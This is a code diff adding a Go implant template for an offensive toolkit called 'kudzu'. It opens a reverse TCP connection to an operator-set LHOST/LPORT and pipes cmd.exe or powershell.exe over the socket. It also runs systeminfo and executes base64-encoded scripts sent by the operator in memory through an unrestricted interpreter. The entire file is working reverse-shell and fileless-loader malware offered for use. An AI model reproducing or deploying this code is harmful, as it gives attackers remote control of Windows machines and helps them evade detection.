@@ -1,0 +1,112 @@
+/*{
+Description: Kudzu shell. Provides access to kudzu scripts, cmd, and powershell. This was a bitch to make.
+Options:
+LHOST
+LPORT
+}*/
+
+
+package main
+
+import (
+	"bufio"
+	"encoding/base64"
+	"fmt"
+	"io"
+	"log"
+	"net"
+	"os/exec"
+	"strings"
+
+	"github.com/TerminalJockey/yaegi/interp"
+	"github.com/TerminalJockey/yaegi/stdlib"
+	"github.com/traefik/yaegi/stdlib/unrestricted"
+	"github.com/traefik/yaegi/stdlib/unsafe"
+)
+
+func main() {
+	revcon, err := net.Dial("tcp", "{{.Laddr}}")
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	conbuf := bufio.NewReader(revcon)
+	for {
+		revcon.Write([]byte("<kudzu shell> "))
+		str, err := conbuf.ReadString('\n')
+		if err != nil {
+			if err != io.EOF {
+				log.Println(err)
+			}
+			break
+		}
+		args := strings.Split(strings.TrimSpace(str), " ")
+
+		switch args[0] {
+		case "runscript":
+			RunScript(revcon)
+		case "sysinfo":
+			sysinfo, err := exec.Command("systeminfo").CombinedOutput()
+			if err != nil {
+				log.Println(err)
+			}
+			revcon.Write(sysinfo)
+		case "cmdshell":
+			newcon := revcon
+			CmdShell(newcon)
+		case "pwshell":
+			newcon := revcon
+			PwShell(newcon)
+		case "help":
+			revcon.Write([]byte("sysinfo: print system info to console\n"))
+			revcon.Write([]byte("cmdshell: spawn cmd.exe shell\n"))
+			revcon.Write([]byte("pwshell: spawn powershell.exe shell\n"))
+			revcon.Write([]byte("kdz_bg: background current session, return to kdz console\n"))
+			revcon.Write([]byte("kdz_exit: exit current session, return to kdz console\n"))
+			revcon.Write([]byte("runscript: run provided kzs in memory. usage: runscript win_calc.kzs\n"))
+		}
+	}
+}
+
+//CmdShell hooks up cmd.exe to the tcp connection
+func CmdShell(conn net.Conn) {
+	cmd := exec.Command("cmd.exe")
+	cmd.Stdout = conn
+	cmd.Stdin = conn
+	cmd.Run()
+	conn.Write([]byte("done\n"))
+}
+
+//PwShell hooks up powershell.exe to the tcp connection
+func PwShell(conn net.Conn) {
+	cmd := exec.Command("powershell.exe")
+	cmd.Stdout = conn
+	cmd.Stdin = conn
+	cmd.Run()
+	conn.Write([]byte("done\n"))
+}
+
+//RunScript runs given kzs
+func RunScript(conn net.Conn) {
+	fmt.Println("entered runscript")
+	script, err := bufio.NewReader(conn).ReadString('\n')
+	if err != nil {
+		log.Println(err)
+	}
+	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
+	if err != nil {
+		log.Println(err)
+	}
+	go interpret(scriptbytes)
+}
+
+func interpret(scriptbytes []byte) {
+	i := interp.New(interp.Options{})
+	i.Use(stdlib.Symbols)
+	i.Use(unrestricted.Symbols)
+	i.Use(unsafe.Symbols)
+	_, err := i.Eval(string(scriptbytes))
+	if err != nil {
+		log.Println(err)
+	}
+}
